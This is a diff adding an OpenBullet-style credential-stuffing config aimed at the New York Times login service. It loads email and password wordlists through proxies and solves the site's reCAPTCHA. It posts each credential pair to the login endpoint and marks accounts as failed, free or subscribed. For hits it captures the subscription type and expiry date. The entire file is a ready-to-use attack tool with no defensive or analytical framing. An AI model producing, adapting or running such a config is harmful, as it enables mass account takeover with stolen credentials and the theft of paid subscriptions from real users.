@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "NYTimes",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-08T15:27:10.5167494+00:00",
+  "AdditionalInfo": "",
+  "Author": "B1rdY",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://myaccount.nytimes.com/auth/login" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#TOKEN PARSE "<SOURCE>" LR "authToken&quot;:&quot;" "&quot;,&quot;captchaProtected" Recursive=FALSE -> VAR "TOKEN" "" "" 
+RECAPTCHA "https://myaccount.nytimes.com/auth/login" "6Ld2YVIUAAAAAC7yEp9y1m_Cu2PkbZY_lx9pv99F" -> VAR "CAPTCHA" 
+#POST REQUEST POST "https://myaccount.nytimes.com/svc/account/auth/v1/login" AutoRedirect=TRUE 
+  CONTENT "{\"auth_token\":\"<TOKEN>=\",\"remember_me\":\"Y\",\"username\":\"<USER>\",\"password\":\"<PASS>\",\"captcha_result\":\"<CAPTCHA>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER ": authority: myaccount.nytimes.com" 
+  HEADER ": path: /svc/account/auth/v1/login" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+#KEYS KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "contract\":\"1.0\",\"errors\":[{\"" 
+    KEY "Username\/password combination not found" 
+  KEYCHAIN Success OR 
+    KEY "redirect_uri" 
+    KEY "subscriber\":true" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "subscriber\":false" 
+#GET REQUEST GET "https://myaccount.nytimes.com/seg/subscription" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "content-type: text/html; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER ": authority: myaccount.nytimes.com" 
+#SUBSCRIPTION PARSE "<SOURCE>" LR "rType\":\"" "\",\"lastA" Recursive=FALSE -> CAP "SUBSCRIPTION" "" "" 
+#EXPIRE PARSE "<SOURCE>" LR "xtPayment\":{\"date\":\"" "T00:00:00.000Z\"}}" Recursive=FALSE -> CAP "EXPIRE" "" "" 
